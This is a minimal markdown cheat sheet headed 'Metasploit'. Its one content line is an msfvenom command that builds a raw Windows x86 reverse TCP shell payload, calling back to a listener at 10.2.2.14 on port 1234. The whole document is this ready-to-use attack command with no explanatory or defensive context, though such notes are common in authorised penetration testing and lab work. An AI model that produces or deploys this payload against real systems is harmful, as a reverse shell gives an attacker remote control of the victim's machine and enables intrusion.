# Metasploit

msfvenom :
```
msfvenom -p windows/shell/reverse_tcp  -a x86 --platform windows LHOST=10.2.2.14 LPORT=1234 -f raw
```
